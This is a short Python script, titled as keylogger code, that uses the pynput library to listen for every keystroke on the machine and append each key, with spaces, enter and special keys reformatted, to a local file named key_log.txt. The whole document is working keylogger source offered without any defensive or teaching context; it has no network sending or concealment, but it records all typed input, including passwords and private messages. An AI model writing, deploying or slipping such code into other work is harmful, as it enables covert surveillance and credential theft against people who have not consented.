#Python Code for keylogger.

from pynput.keyboard import Listener

# Define log file
LOG_FILE = "key_log.txt"

# Function to write key logs to file
def write_to_file(key):
    try:
        # Remove ' character around keys
        key = str(key).replace("'", "")

        # Special case handling
        if key == "Key.space":
            key = " "  # Convert space to actual space
        elif key == "Key.enter":
            key = "\n"  # Convert enter key to new line
        elif key.startswith("Key"):
            key = f"[{key.replace('Key.', '')}]"  # Format special keys

        # Append key to log file
        with open(LOG_FILE, "a") as file:
            file.write(key)
    except Exception as e:
        print(f"Error writing to file: {e}")

# Function to listen for keystrokes
def on_press(key):
    write_to_file(key)

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
